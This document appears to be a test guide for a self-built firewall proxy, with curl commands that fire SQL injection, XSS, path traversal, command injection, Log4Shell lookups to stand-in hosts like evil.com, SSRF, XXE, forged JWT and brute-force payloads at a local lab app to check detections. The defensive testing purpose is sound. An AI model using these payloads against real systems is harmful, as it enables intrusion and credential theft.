# Local App + NGFW Monitor — Live Detection & Mitigation Test Guide

## TL;DR — What Works Right Now

| Tier | Status | What it does |
|---|---|---|
| **Tier-1 — Go Rules** | ✅ **FULLY LIVE** | Detects attacks the moment they hit the proxy — zero training needed |
| **Tier-2 — Redis Reputation** | ✅ **LIVE** (Redis must be running) | Blocks repeat offenders by IP score |
| **Tier-3 — ML Scoring** | ⚠️ **Detect only** (Phase G not wired yet) | Models not yet wired to the proxy decision engine |
| **Auto-Block enforcement** | ⚠️ **Manual only** (Phase H not built) | Analyst can manually block via `/api/admin/blocked`; proxy doesn't auto-reject yet |

> **Bottom line:** You WILL see detections fire in real time for every attack payload. The proxy will log, stream to dashboard via WebSocket, and emit alerts. **Active dropping/blocking** requires Phase G (50ms Go→ML call) to be wired — that's the next sprint.

---

## Step 1 — Deploy a Vulnerable Target App

Pick **any** of these. The proxy sits in front of it regardless.

### Option A — DVWA (easiest, already in the sandbox)

```bash
cd sandbox
# Add temporary host ports so you can test locally
# Edit docker-compose.sandbox.yml temporarily — add ports to dvwa:
#   ports:
#     - "127.0.0.1:8081:80"
docker-compose -f docker-compose.sandbox.yml up -d
```

DVWA is now at `http://127.0.0.1:8081` (direct).

### Option B — OWASP Juice Shop

```bash
docker run -d -p 127.0.0.1:8081:3000 bkimminich/juice-shop
```

Juice Shop is now at `http://127.0.0.1:8081`.

### Option C — Your Own Python/Node App

```bash
# Python — tiny HTTP server (instantly exploitable path traversal!)
python3 -m http.server 8081 --directory /var/www/html

# Node — basic express app
node -e "
const express = require('express');
const app = express();
app.get('/', (req,res) => res.send('<h1>Hello World</h1>'));
app.get('/user/:id', (req,res) => res.json({id: req.params.id}));
app.listen(8081, () => console.log('App on :8081'));
"
```

---

## Step 2 — Configure proxy_config.yaml

Edit `Security/proxy_config.yaml` — add ONE listener entry that puts the NGFW in front of your app:

```yaml
listeners:
  # YOUR APP ENTRY
  - listen_port: 9090        # ATTACKERS hit THIS port (the proxy listens here)
    backend_addr: 127.0.0.1:8081  # YOUR APP is running here
    transport: tcp
    service: http
    enabled: true
```

> The proxy already has `listen_port: 8080 -> backend: 127.0.0.1:3000` in use. Use port **9090** to avoid conflict.

---

## Step 3 — Start the Full Stack

Open 4 terminals:

```bash
# Terminal 1 — Redis (Tier-2 reputation)
redis-server

# Terminal 2 — MongoDB + Node.js Dashboard Backend
cd Web/backend && npm run dev

# Terminal 3 — React Dashboard (optional, to see live events)
cd Web/frontend && npm run dev
# Open http://localhost:5173 in browser

# Terminal 4 — The NGFW Monitor (as root — needed for raw sockets)
cd Security
sudo ./ngfw-monitor
```

In the NGFW CLI, select **Option 3 (Integrated Mode)**.

**Verify the proxy is working:**
```bash
curl http://localhost:9090/
# Should return your app's normal response
```

---

## Step 4 — Fire Attack Payloads

All attacks go to `http://localhost:9090/` (the PROXY port, NOT your app port).

### 4.1 SQL Injection

```bash
# Classic SQLi
curl "http://localhost:9090/page?id=1' OR '1'='1"

# UNION-based
curl "http://localhost:9090/search?q=admin' UNION SELECT null,username,password FROM users--"

# Time-based blind
curl "http://localhost:9090/user?id=1'; WAITFOR DELAY '0:0:5'--"

# Encoded (evasion bypass)
curl "http://localhost:9090/page?id=1%27%20OR%20%271%27%3D%271"
```

**Expected:** `CatSQLi` → CRITICAL severity → appears in dashboard within ~1s

---

### 4.2 Cross-Site Scripting (XSS)

```bash
curl "http://localhost:9090/search?q=<script>alert('XSS')</script>"
curl "http://localhost:9090/name?v=<img src=x onerror=alert(1)>"
```

**Expected:** `CatXSS` → HIGH severity

---

### 4.3 Path Traversal

```bash
curl "http://localhost:9090/files?path=../../etc/passwd"
curl "http://localhost:9090/files?path=..%2F..%2Fetc%2Fshadow"
curl "http://localhost:9090/files?path=..%252F..%252Fetc%252Fpasswd"
```

**Expected:** `CatPathTraversal` → HIGH severity

---

### 4.4 Command Injection

```bash
curl "http://localhost:9090/ping?host=127.0.0.1;id"
curl "http://localhost:9090/ping?host=127.0.0.1|whoami"
```

**Expected:** `CatCommandInjection` → CRITICAL severity

---

### 4.5 Log4Shell (CVE-2021-44228)

```bash
# Classic JNDI lookup in header
curl -H "X-Api-Version: \${jndi:ldap://evil.attacker.com/payload}" http://localhost:9090/

# In User-Agent
curl -A "\${jndi:ldap://evil.com/a}" http://localhost:9090/

# Obfuscated variant
curl -H "X-Custom: \${j\${::-n}di:ldap://evil.com/a}" http://localhost:9090/
```

**Expected:** `CatLog4Shell` → CRITICAL severity

---

### 4.6 SSRF

```bash
curl "http://localhost:9090/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "http://localhost:9090/proxy?target=http://127.0.0.1:27017"
```

**Expected:** `CatSSRF` → HIGH severity

---

### 4.7 XXE

```bash
curl -X POST http://localhost:9090/xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>'
```

**Expected:** `CatXXE` → CRITICAL severity

---

### 4.8 HTTP Request Smuggling

```bash
curl -X POST http://localhost:9090/ \
  -H "Transfer-Encoding: chunked" \
  -H "Content-Length: 100" \
  --data-binary "0\r\n\r\n"
```

**Expected:** `CatHTTPSmuggling` → HIGH severity

---

### 4.9 JWT alg:none Attack (Phase B — NEW)

```bash
# Build an alg:none token manually
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')
PAYLOAD=$(echo -n '{"sub":"admin","role":"superuser","exp":9999999999}' | base64 | tr -d '=' | tr '+/' '-_')
MALICIOUS_TOKEN="${HEADER}.${PAYLOAD}."

curl http://localhost:9090/api/admin/users \
  -H "Authorization: Bearer $MALICIOUS_TOKEN"
```

**Expected:** `JWT-ALG-NONE-001` → CRITICAL severity

---

### 4.10 BOLA / ID Enumeration (Phase B — NEW)

```bash
# Enumerate 25 different user IDs rapidly — fires at ID #20
for i in $(seq 1 25); do
  curl -s -o /dev/null "http://localhost:9090/api/users/$i"
  sleep 0.05
done
```

**Expected:** `BOLA-ENUM-001` after the 20th unique ID → HIGH severity

---

### 4.11 Scanner / Bot Detection

```bash
# Nikto scan
nikto -h http://localhost:9090/

# dirb forced browsing
dirb http://localhost:9090/ /usr/share/wordlists/dirb/common.txt
```

**Expected:** `CatBotScanner` and `CatDirBruteForce` → HIGH severity

---

### 4.12 Brute-Force Detection

```bash
# Rapid login attempts
for i in $(seq 1 20); do
  curl -s -X POST http://localhost:9090/login \
    -d "username=admin&password=guess$i" -o /dev/null
done
```

**Expected:** `CatBruteForce` fires after threshold (default: 5 attempts) → HIGH severity

---

### 4.13 CAPTCHA Gate Trigger (Phase C — NEW)

```bash
# 10 rapid requests to a CAPTCHA-protected endpoint
for i in $(seq 1 10); do
  curl -s -w "%{http_code}\n" -X POST http://localhost:5000/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email":"test@test.com","password":"wrong"}'
done
```

**Expected:** 7th+ request returns `HTTP 403` with `{ captcha_required: true }`

---

## Step 5 — What to Watch

### In the NGFW Terminal (stdout)
```
🔴 CRITICAL [sqli] 127.0.0.1:54321 → :9090
   Summary: SQL injection pattern detected in URI parameter
   Evidence: ?id=1' OR '1'='1
```

### In the Dashboard (http://localhost:5173)
- **Threats tab** — live feed of all detections with severity colour coding
- **Network tab** — connection graph
- Events appear within ~1 second via WebSocket

### In the Logs Directory
```bash
tail -f Security/logs/detections.jsonl | python3 -m json.tool
```

---

## Step 6 — Detection vs Mitigation Matrix

| Attack | Detected? | Mitigated (blocked)? | Notes |
|---|---|---|---|
| SQL Injection | ✅ YES | ⚠️ Logged only | Phase G auto-drop pending |
| XSS | ✅ YES | ⚠️ Logged only | |
| Path Traversal | ✅ YES | ⚠️ Logged only | |
| Command Injection | ✅ YES | ⚠️ Logged only | |
| Log4Shell | ✅ YES | ⚠️ Logged only | |
| SSRF | ✅ YES | ⚠️ Logged only | |
| XXE | ✅ YES | ⚠️ Logged only | |
| HTTP Smuggling | ✅ YES | ⚠️ Logged only | |
| JWT alg:none | ✅ YES (Phase B) | ⚠️ Logged only | |
| JWT expired | ✅ YES (Phase B) | ⚠️ Logged only | |
| BOLA enum | ✅ YES (Phase B) | ⚠️ Logged only | |
| Bot/Scanner | ✅ YES | ⚠️ Logged only | |
| Brute-force | ✅ YES | ⚠️ Logged only | |
| Repeat offender IP (rep score ≥ 80) | ✅ YES | ✅ **BLOCKED** via Redis | Tier-2, works now |
| Manual analyst block | ✅ YES | ✅ **BLOCKED** | `POST /api/admin/blocked` |
| CAPTCHA gate trigger | ✅ YES | ✅ **CHALLENGED** | Phase C, works now |
| Auto-block (risk_score ≥ 85) | ❌ NOT YET | ❌ NOT YET | Phase G pending |

---

## Step 7 — Manually Block an Attacker After Detection

After you see an attack fire, block the IP immediately:

```bash
# Get auth token
TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@admin.com","password":"admin123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin).get('token',''))")

# Block the attacker IP
curl -X POST http://localhost:5000/api/admin/blocked \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "targetType": "ip",
    "targetValue": "127.0.0.1",
    "reason": "SQLi detected in live test",
    "protocol": "HTTP",
    "action": "block"
  }'
```

This writes to **MongoDB (source of truth)** + **Redis fast-path** simultaneously.

---

## What Phase G Adds (Auto-Mitigation)

Once the 50ms Go→FastAPI call is wired in the proxy:

```
Attack hits proxy
  → Tier-1 Go rules fire (< 1ms)
  → Tier-2 Redis rep check (< 2ms)
  → Tier-3 ML score (< 50ms timeout, fail-open)
  → risk_score >= 85 → auto-create BlockedEntity + DROP connection
  → risk_score >= 60 → alert dashboard only
```

**Until then:** detections are 100% accurate and real-time — mitigation is manual via the dashboard API.
